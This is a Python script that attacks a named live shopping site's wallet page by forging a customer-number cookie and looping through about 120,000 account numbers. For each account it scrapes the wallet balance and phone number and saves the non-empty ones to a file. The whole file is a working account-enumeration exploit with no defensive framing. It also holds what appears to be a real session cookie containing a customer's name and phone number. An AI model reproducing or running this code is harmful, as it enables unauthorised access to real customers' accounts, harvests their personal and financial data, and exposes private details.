import requests
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Base URL and headers
base_url = "https://broncopolos.com/user/wallet/"
headers = {
    "Host": "broncopolos.com",
    "Cookie": "PHPSESSID=7ac397c430a383ae3254773d4ebd0338; virtual_customer_id=5394189; db_refetched_saved_sno=2; _tccl_visitor=260ec89d-dd2e-4076-aef3-f5d7f9950b00; _tccl_visit=260ec89d-dd2e-4076-aef3-f5d7f9950b00; current_phone_number=7054128930; current_customer_full_name=Faizan+Khan; login_customer_sno=1150; login_customer_phone_number=7054128930; login_customer_full_name=Faizan+Khan; _scc_session=pc=4&C_TOUCH=2024-10-24T16:32:02.667Z",
    "Cache-Control": "no-store, no-cache, must-revalidate",
    "Sec-Ch-Ua": "\"Chromium\";v=\"130\", \"Microsoft Edge\";v=\"130\", \"Not?A_Brand\";v=\"99\"",
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": "\"Windows\"",
    "Accept-Language": "en-US,en;q=0.9",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Connection": "keep-alive"
}

# Iterate over the customer numbers
with open("output.txt", "w", encoding="utf-8") as output_file:
    for sno in range(34829, 155195):
        # Update the Cookie with the current customer number
        headers["Cookie"] = f"login_customer_sno={sno};"

        try:
            response = requests.get(base_url, headers=headers, verify=False)
        except requests.exceptions.SSLError as e:
            print(f"SSL error for sno: {sno}, continuing...")
            continue

        content = response.text

        # Check for the ₹ value and phone number in the response
        amount_match = re.search(r'<span class="orders_page_order_status_span bg_green" ><b>₹(\d+)</b></span>', content)
        phone_match = re.search(r'wigzo \("identify", {[^}]+phone: "([^"]+)"[^}]+}\);', content)

        # Debugging info
        print(f"Sno: {sno}", end='')
        if amount_match:
            print(f" Paisa: ₹{amount_match.group(1)}", end='')
        if phone_match:
            print(f" Phone: {phone_match.group(1)}")

        if amount_match and phone_match:
            amount = int(amount_match.group(1))
            if amount > 0:
                phone = phone_match.group(1)
                output_file.write(f"₹: {amount}, Phone: {phone}\n")

print("Script completed.")
